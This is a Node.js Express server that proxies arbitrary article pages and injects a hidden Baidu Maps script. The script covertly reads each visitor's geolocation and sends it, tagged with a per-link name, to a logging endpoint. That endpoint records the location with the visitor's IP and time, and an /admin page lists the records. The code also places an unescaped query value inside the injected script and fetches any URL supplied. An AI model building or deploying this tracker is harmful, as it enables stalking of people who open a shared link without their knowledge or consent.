const express = require('express')
const app = express()
const jsdom = require("jsdom")
const { JSDOM } = jsdom
const request = require('request-promise')
const rq = require('request')
const fs = require('fs')
const uuidv1 = require('uuid/v1')
const path = require('path')
app.engine('jade', require('jade').__express);
app.set("view engine", "jade");

app.get('/admin', function (req, res) {
    var str = fs.readFileSync('record.txt').toString()
    var record = str.split('\n').map(i => {
        return i.split(' ')
    }).filter(i => {
        return i.length === 4
    }).map(i => {
        i[3] = new Date(Number(i[3])).toLocaleString('zh')
        return i
    })
    res.render('admin', { record: record })
})
app.get('/save/', function (req, res) {
    console.log(req.query)
    var real_ip = req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        req.connection.socket.remoteAddress || ''
    fs.writeFile('record.txt', `${req.query.name} ${req.query.location} ${real_ip} ${new Date().getTime()}\n`, { flag: 'a' }, err => { });
    res.send({ success: true })
})
app.get('/:url/', async function (req, res) {
    var html = await request({
        method: 'get',
        url: req.params.url
    })
    const dom = new JSDOM(html)
    var eles = dom.window.document.querySelectorAll("img")
    for (n in dom.window.document.querySelectorAll("img")) {
        var item = eles[n]
        if (item.attributes) {
            var src = item.attributes['data-src'] || item.attributes['data-src']
            if (src) {
                try {
                    var fileName = await saveImg(src.value)
                    item.setAttribute('src', '/files/' + fileName)
                    item.removeAttribute('data-src')
                    item.removeAttribute('data-before-oversubscription-url')
                } catch (e) {
                    console.log(e)
                }
            }
        }
    }
    var mapSDK = dom.window.document.createElement('script')
    mapSDK.setAttribute('type', 'text/javascript')
    mapSDK.setAttribute('src', 'http://api.map.baidu.com/api?v=2.0&ak=ktCm4H6RbiLV7FUeUmk2384NjPoNgYMI')
    dom.window.document.head.append(mapSDK)

    var mapDom = dom.window.document.createElement('div')
    mapDom.style.display = 'none'
    mapDom.setAttribute('id', 'allmap')
    dom.window.document.body.append(mapDom)

    var mapCode = dom.window.document.createElement('script')
    mapCode.setAttribute('type', 'text/javascript')
    mapCode.innerHTML = `var map = new BMap.Map("allmap");
    var point = new BMap.Point(116.331398,39.897445);
    map.centerAndZoom(point,12);
    
    var geolocation = new BMap.Geolocation();
    // 开启SDK辅助定位
    geolocation.enableSDKLocation();
    geolocation.getCurrentPosition(function(r){
        if(this.getStatus() == BMAP_STATUS_SUCCESS){
            var mk = new BMap.Marker(r.point);
            map.addOverlay(mk);
            map.panTo(r.point);
            var xhr=new XMLHttpRequest();
            xhr.open('get', '/save?location=' + r.point.lat + ',' + r.point.lng + '&name=${req.query.name}');
            xhr.send();
        }
        else {
        }        
    });`
    dom.window.document.body.append(mapCode)
    res.send(dom.serialize())
})
app.get('/files/:fileName/', function (req, res) {
    var fileName = req.params.fileName
    res.sendFile(path.resolve(__dirname, 'files', fileName))
})
app.listen(8081)

function saveImg(url) {
    var fileName = uuidv1()
    return new Promise((resolve, reject) => {
        var writeStream = fs.createWriteStream('./files/' + fileName)
        writeStream.on('finish', () => {
            resolve(fileName)
        })
        rq.get(url)
            .on('error', err => {
                reject(err)
            })
            .pipe(writeStream)
    })
}
